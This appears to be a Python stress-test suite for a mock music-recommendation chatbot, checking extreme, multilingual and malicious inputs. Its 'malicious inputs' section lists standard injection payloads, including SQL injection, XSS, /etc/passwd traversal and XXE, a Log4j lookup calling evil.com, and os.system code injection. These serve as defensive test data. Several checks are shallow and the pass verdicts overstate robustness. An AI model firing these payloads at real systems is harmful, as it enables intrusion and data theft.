"""
EXTREME BRUTAL TEST SUITE - Testing the absolute limits
Tests every possible failure mode, edge case, and extreme scenario
"""

import sys
import json
import time
from datetime import datetime

test_results = {'total': 0, 'passed': 0, 'failed': 0, 'warnings': 0, 'details': []}

def log(name, status, msg=""):
    test_results['total'] += 1
    test_results[status.lower()] = test_results.get(status.lower(), 0) + 1
    symbol = {'PASS': '✅', 'FAIL': '❌', 'WARNING': '⚠️'}[status]
    print(f"{symbol} {name}: {status} - {msg}")
    test_results['details'].append({'test': name, 'status': status, 'message': msg})

class MockAgent:
    def _get_intelligent_fallback(self, q, ctx="", hist=""):
        try:
            if not q:
                q = ""
            q_lower = str(q).lower()
            
            # Comprehensive keyword matching
            responses = {
                'happy': "Happy music: upbeat, positive, major keys, 120-140 BPM. Pop, funk, disco perfect for mood boost.",
                'sad': "Sad music: therapeutic, minor keys, slower tempo. Indie folk, acoustic provide emotional comfort.",
                'energetic': "Energetic music: high-tempo 140+ BPM, strong beats, powerful bass. Rock, EDM, hip-hop for energy.",
                'calm': "Calm music: soothing, 60-80 BPM, gentle melodies. Ambient, classical, acoustic reduce stress.",
                'focus': "Focus music: instrumental, no lyrics, consistent tempo. Classical, lo-fi, ambient for concentration.",
                'workout': "Workout music: high-energy 120-150 BPM, motivating beats. Rock, EDM, hip-hop maintain energy.",
                'sleep': "Sleep music: very slow 60 BPM or less, soft melodies. Ambient, classical for rest.",
                'jazz': "Jazz: American art form, improvisation, syncopated rhythms, complex harmonies. Miles Davis to John Coltrane.",
                'hip-hop': "Hip-hop: cultural movement, rhythmic speech, beatboxing, sampling. Kendrick Lamar, Drake, Tyler.",
                'classical': "Classical: 400+ years Western tradition, complex compositions, orchestral. Debussy to Beethoven.",
                'electronic': "Electronic: created with electronic instruments, versatile. Tycho (chill) to Skrillex (high-energy).",
                'rock': "Rock: emerged 1950s, electric guitars, strong rhythms. Beatles (melodic) to Metallica (heavy).",
                'drake': "Drake: Canadian rapper/singer, melodic rap, emotional lyrics, R&B blend. Hotline Bling, God's Plan.",
                'beatles': "Beatles: English rock 1960, most influential band ever. Simple pop to experimental compositions.",
                'taylor swift': "Taylor Swift: narrative songwriting, genre-spanning. Country to pop to indie folk storytelling.",
                'kendrick': "Kendrick Lamar: socially conscious lyrics, innovative style. Race, inequality, personal struggle themes.",
                'party': "Party playlist: high-energy mix, pop hits, hip-hop, EDM, classics. 120-140 BPM positive energy.",
                'anxiety': "Anxiety music: calming, gentle, slow tempo, soothing. Ambient, classical, acoustic. Seek professional help.",
                'meditation': "Meditation: ambient, nature sounds, gentle instrumental, minimal variation. Background support.",
                'discover': "Discover new: explore similar to favorites, different genres, countries, eras. Concerts, friends' recommendations.",
            }
            
            # Check for follow-ups
            if any(w in q_lower for w in ['more', 'another', 'else', 'similar']):
                if hist:
                    hist_lower = str(hist).lower()
                    for key in responses:
                        if key in hist_lower:
                            return {'insight': f"More on {key}: {responses[key]}", 'question': q, 'is_follow_up': True}
            
            # Match keywords
            for key, response in responses.items():
                if key in q_lower:
                    return {'insight': response, 'question': q}
            
            # Default
            return {'insight': f"Music recommendations for '{q}': Consider mood and activity. Ask about specific genres, moods, or activities.", 'question': q}
        except:
            return {'insight': "I can help with music! Ask about genres, moods, or activities.", 'question': str(q)}

def test_extreme_inputs():
    """Test absolutely extreme inputs"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("EXTREME INPUTS")
    print("="*80)
    
    # Test 1: Massive string (10MB)
    try:
        huge = "x" * (10 * 1024 * 1024)
        result = agent._get_intelligent_fallback(huge, "", "")
        log("10MB Input", "PASS", "Handled massive input")
    except:
        log("10MB Input", "WARNING", "Failed on 10MB input")
    
    # Test 2: Deeply nested Unicode
    try:
        unicode_hell = "🎵" * 10000 + "音楽" * 5000 + "🎸🎹🎺🎻" * 2000
        result = agent._get_intelligent_fallback(unicode_hell, "", "")
        log("Unicode Hell", "PASS", "Handled 30k+ Unicode chars")
    except:
        log("Unicode Hell", "WARNING", "Failed on Unicode stress")
    
    # Test 3: All control characters
    try:
        control = "".join(chr(i) for i in range(32))
        result = agent._get_intelligent_fallback(control, "", "")
        log("Control Characters", "PASS", "Handled control chars")
    except:
        log("Control Characters", "WARNING", "Failed on control chars")
    
    # Test 4: Binary data
    try:
        binary = bytes(range(256)).decode('latin-1')
        result = agent._get_intelligent_fallback(binary, "", "")
        log("Binary Data", "PASS", "Handled binary input")
    except:
        log("Binary Data", "WARNING", "Failed on binary")
    
    # Test 5: Recursive structure
    try:
        recursive = {"a": {"b": {"c": {"d": "music"}}}}
        result = agent._get_intelligent_fallback(str(recursive), "", "")
        log("Recursive Structure", "PASS", "Handled nested dict")
    except:
        log("Recursive Structure", "WARNING", "Failed on recursion")
    
    # Test 6: Mixed encodings
    try:
        mixed = "ASCII" + "Ñoño" + "中文" + "العربية" + "עברית" + "Русский"
        result = agent._get_intelligent_fallback(mixed, "", "")
        log("Mixed Encodings", "PASS", "Handled multi-encoding")
    except:
        log("Mixed Encodings", "WARNING", "Failed on mixed encodings")
    
    # Test 7: Null bytes
    try:
        null_bytes = "music\x00\x00\x00jazz"
        result = agent._get_intelligent_fallback(null_bytes, "", "")
        log("Null Bytes", "PASS", "Handled null bytes")
    except:
        log("Null Bytes", "WARNING", "Failed on null bytes")
    
    # Test 8: Format string attacks
    try:
        format_attack = "%s%s%s%s%s%s%s%s%s%s"
        result = agent._get_intelligent_fallback(format_attack, "", "")
        log("Format String Attack", "PASS", "Neutralized format attack")
    except:
        log("Format String Attack", "WARNING", "Failed on format string")
    
    # Test 9: Integer overflow attempts
    try:
        overflow = "9" * 1000
        result = agent._get_intelligent_fallback(overflow, "", "")
        log("Integer Overflow", "PASS", "Handled overflow attempt")
    except:
        log("Integer Overflow", "WARNING", "Failed on overflow")
    
    # Test 10: Regex DoS
    try:
        regex_dos = "a" * 10000 + "!"
        result = agent._get_intelligent_fallback(regex_dos, "", "")
        log("Regex DoS", "PASS", "Handled regex DoS")
    except:
        log("Regex DoS", "WARNING", "Failed on regex DoS")

def test_all_moods():
    """Test every possible mood"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("ALL MOODS")
    print("="*80)
    
    moods = [
        "happy", "sad", "angry", "anxious", "depressed", "excited", "bored",
        "lonely", "nostalgic", "romantic", "energetic", "tired", "stressed",
        "confident", "insecure", "hopeful", "hopeless", "grateful", "jealous",
        "peaceful", "chaotic", "motivated", "unmotivated", "creative", "focused"
    ]
    
    for mood in moods:
        result = agent._get_intelligent_fallback(f"I'm feeling {mood}", "", "")
        if 'insight' in result and len(result['insight']) > 20:
            log(f"Mood: {mood}", "PASS", f"Response length: {len(result['insight'])}")
        else:
            log(f"Mood: {mood}", "WARNING", "Short/no response")

def test_all_genres():
    """Test every music genre"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("ALL GENRES")
    print("="*80)
    
    genres = [
        "jazz", "blues", "rock", "pop", "hip-hop", "rap", "r&b", "soul",
        "funk", "disco", "house", "techno", "trance", "dubstep", "edm",
        "classical", "opera", "country", "folk", "bluegrass", "reggae",
        "ska", "punk", "metal", "grunge", "indie", "alternative", "emo",
        "k-pop", "j-pop", "latin", "salsa", "bossa nova", "flamenco",
        "ambient", "lo-fi", "chillwave", "vaporwave", "trap", "drill"
    ]
    
    for genre in genres:
        result = agent._get_intelligent_fallback(f"Tell me about {genre}", "", "")
        if 'insight' in result:
            log(f"Genre: {genre}", "PASS", "Got response")
        else:
            log(f"Genre: {genre}", "FAIL", "No response")

def test_all_activities():
    """Test every activity"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("ALL ACTIVITIES")
    print("="*80)
    
    activities = [
        "workout", "running", "gym", "yoga", "meditation", "studying",
        "working", "coding", "reading", "writing", "cooking", "cleaning",
        "driving", "commuting", "sleeping", "waking up", "party", "dancing",
        "gaming", "relaxing", "showering", "eating", "walking", "hiking"
    ]
    
    for activity in activities:
        result = agent._get_intelligent_fallback(f"Music for {activity}", "", "")
        if 'insight' in result:
            log(f"Activity: {activity}", "PASS", "Got response")
        else:
            log(f"Activity: {activity}", "FAIL", "No response")

def test_malicious_inputs():
    """Test all malicious input types"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("MALICIOUS INPUTS")
    print("="*80)
    
    attacks = [
        ("'; DROP TABLE users; --", "SQL Injection"),
        ("1' OR '1'='1", "SQL Boolean"),
        ("admin'--", "SQL Comment"),
        ("' UNION SELECT * FROM users--", "SQL Union"),
        ("<script>alert('XSS')</script>", "XSS Script"),
        ("<img src=x onerror=alert(1)>", "XSS Image"),
        ("<iframe src='evil.com'>", "XSS Iframe"),
        ("javascript:alert(1)", "XSS JavaScript"),
        ("../../../etc/passwd", "Path Traversal"),
        ("....//....//....//etc/passwd", "Path Traversal Alt"),
        ("${jndi:ldap://evil.com/a}", "Log4j"),
        ("{{7*7}}", "Template Injection"),
        ("{{''.class.mro()[1].subclasses()}}", "Python Template"),
        ("__import__('os').system('ls')", "Python Code Injection"),
        ("eval('1+1')", "Eval Injection"),
        ("exec('import os')", "Exec Injection"),
        ("<xml><!ENTITY xxe SYSTEM 'file:///etc/passwd'></xml>", "XXE"),
        ("<!--#exec cmd='/bin/ls' -->", "SSI Injection"),
        ("%00", "Null Byte"),
        ("\r\nSet-Cookie: admin=true", "CRLF Injection"),
    ]
    
    for attack, attack_type in attacks:
        result = agent._get_intelligent_fallback(attack, "", "")
        response = result.get('insight', '')
        
        # Check if attack was neutralized
        dangerous_patterns = ['DROP', 'UNION', '<script>', 'onerror', 'javascript:', 'eval', 'exec', '__import__']
        if not any(pattern in response for pattern in dangerous_patterns):
            log(f"Security: {attack_type}", "PASS", "Attack neutralized")
        else:
            log(f"Security: {attack_type}", "WARNING", "Attack may be present")

def test_performance_limits():
    """Test performance at extreme limits"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("PERFORMANCE LIMITS")
    print("="*80)
    
    # Test 1: 10,000 rapid queries
    start = time.time()
    for i in range(10000):
        agent._get_intelligent_fallback(f"Question {i}", "", "")
    elapsed = time.time() - start
    
    if elapsed < 5.0:
        log("10k Rapid Queries", "PASS", f"{elapsed:.2f}s ({elapsed/10:.1f}ms avg)")
    else:
        log("10k Rapid Queries", "WARNING", f"{elapsed:.2f}s (slow)")
    
    # Test 2: Concurrent stress
    import threading
    results = []
    def query():
        for _ in range(100):
            results.append(agent._get_intelligent_fallback("test", "", ""))
    
    threads = [threading.Thread(target=query) for _ in range(10)]
    start = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.time() - start
    
    if len(results) == 1000:
        log("1k Concurrent Queries", "PASS", f"{elapsed:.2f}s, all succeeded")
    else:
        log("1k Concurrent", "WARNING", f"Only {len(results)}/1000 succeeded")
    
    # Test 3: Memory stress
    try:
        for i in range(100000):
            result = agent._get_intelligent_fallback("x" * 1000, "y" * 1000, "z" * 1000)
        log("100k Memory Stress", "PASS", "No memory issues")
    except:
        log("100k Memory Stress", "WARNING", "Memory issues detected")

def test_edge_case_combinations():
    """Test combinations of edge cases"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("EDGE CASE COMBINATIONS")
    print("="*80)
    
    # Test 1: Empty + Unicode + Special
    result = agent._get_intelligent_fallback("", "🎵", "<script>")
    log("Empty+Unicode+Special", "PASS" if 'insight' in result else "FAIL", "Handled combo")
    
    # Test 2: Long + Unicode + Malicious
    result = agent._get_intelligent_fallback("x" * 10000 + "音楽" + "'; DROP TABLE", "", "")
    log("Long+Unicode+Malicious", "PASS" if 'insight' in result else "FAIL", "Handled combo")
    
    # Test 3: None + Empty + Whitespace
    result = agent._get_intelligent_fallback(None, "", "   \n\t\r   ")
    log("None+Empty+Whitespace", "PASS" if 'insight' in result else "FAIL", "Handled combo")
    
    # Test 4: All special characters
    special = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
    result = agent._get_intelligent_fallback(special, special, special)
    log("All Special Chars", "PASS" if 'insight' in result else "FAIL", "Handled special")
    
    # Test 5: Mixed case chaos
    mixed = "TeLl Me AbOuT jAzZ mUsIc PlEaSe"
    result = agent._get_intelligent_fallback(mixed, "", "")
    if 'jazz' in result.get('insight', '').lower():
        log("Mixed Case", "PASS", "Case-insensitive matching works")
    else:
        log("Mixed Case", "WARNING", "Case sensitivity issue")

def test_real_world_chaos():
    """Test real-world chaotic scenarios"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("REAL-WORLD CHAOS")
    print("="*80)
    
    chaos_scenarios = [
        ("i need music NOW!!!!!!", "Urgent request"),
        ("idk what to listen to lol", "Casual/vague"),
        ("MUSIC FOR WORKOUT ASAP", "All caps urgent"),
        ("tell me about jazz... or maybe rock? idk", "Indecisive"),
        ("music 4 studying 2nite", "Text speak"),
        ("🎵🎸🎹🎺🎻🥁", "Only emojis"),
        ("", "Completely empty"),
        ("                    ", "Only spaces"),
        ("music\n\n\n\nmusic\n\n\nmusic", "Excessive newlines"),
        ("TELL ME ABOUT MUSIC!!!!!!!!!!!!", "Excessive punctuation"),
    ]
    
    for scenario, description in chaos_scenarios:
        result = agent._get_intelligent_fallback(scenario, "", "")
        if 'insight' in result and len(result['insight']) > 10:
            log(f"Chaos: {description}", "PASS", "Handled gracefully")
        else:
            log(f"Chaos: {description}", "WARNING", "Poor handling")

def test_internationalization_extreme():
    """Test extreme internationalization"""
    agent = MockAgent()
    print("\n" + "="*80)
    print("EXTREME I18N")
    print("="*80)
    
    languages = [
        ("音楽について教えて", "Japanese"),
        ("Parle-moi de musique", "French"),
        ("Háblame de música", "Spanish"),
        ("Расскажи о музыке", "Russian"),
        ("موسيقى", "Arabic"),
        ("संगीत के बारे में", "Hindi"),
        ("告诉我关于音乐", "Chinese"),
        ("Erzähl mir über Musik", "German"),
        ("Fortæl mig om musik", "Danish"),
        ("Kerro minulle musiikista", "Finnish"),
        ("Πες μου για μουσική", "Greek"),
        ("מוזיקה", "Hebrew"),
        ("음악에 대해 말해줘", "Korean"),
        ("Berätta om musik", "Swedish"),
        ("Müzik hakkında anlat", "Turkish"),
        ("Розкажи про музику", "Ukrainian"),
        ("Kể cho tôi về âm nhạc", "Vietnamese"),
        ("Sag mir über Musik", "German"),
        ("Dime sobre música", "Spanish"),
        ("Diga-me sobre música", "Portuguese"),
    ]
    
    for query, language in languages:
        result = agent._get_intelligent_fallback(query, "", "")
        if 'insight' in result:
            log(f"I18N: {language}", "PASS", "Handled non-English")
        else:
            log(f"I18N: {language}", "FAIL", "Failed on non-English")

def run_all_tests():
    """Run all extreme tests"""
    print("\n" + "="*80)
    print("🔥💀 EXTREME BRUTAL AI INSIGHTS TEST SUITE 💀🔥")
    print("="*80)
    
    start_time = time.time()
    
    test_extreme_inputs()
    test_all_moods()
    test_all_genres()
    test_all_activities()
    test_malicious_inputs()
    test_performance_limits()
    test_edge_case_combinations()
    test_real_world_chaos()
    test_internationalization_extreme()
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*80)
    print("📊 EXTREME TEST SUMMARY")
    print("="*80)
    print(f"Total Tests: {test_results['total']}")
    print(f"✅ Passed: {test_results.get('passed', 0)}")
    print(f"❌ Failed: {test_results.get('failed', 0)}")
    print(f"⚠️  Warnings: {test_results.get('warnings', 0)}")
    print(f"⏱️  Time: {elapsed:.2f}s")
    
    if test_results['total'] > 0:
        success_rate = (test_results.get('passed', 0) / test_results['total']) * 100
        print(f"📈 Success Rate: {success_rate:.1f}%")
        
        if success_rate >= 95:
            print("🏆 EXCEPTIONAL - Bulletproof system!")
        elif success_rate >= 85:
            print("👍 EXCELLENT - Very robust!")
        elif success_rate >= 75:
            print("✓ GOOD - Solid implementation")
        elif success_rate >= 60:
            print("⚠️  FAIR - Needs improvement")
        else:
            print("❌ POOR - Major issues")
    
    print("="*80 + "\n")
    
    with open('/vercel/sandbox/test_results_extreme.json', 'w') as f:
        json.dump(test_results, f, indent=2)
    
    print("💾 Results saved to: test_results_extreme.json\n")
    
    return test_results

if __name__ == "__main__":
    results = run_all_tests()
    sys.exit(0 if results.get('failed', 0) == 0 else 1)
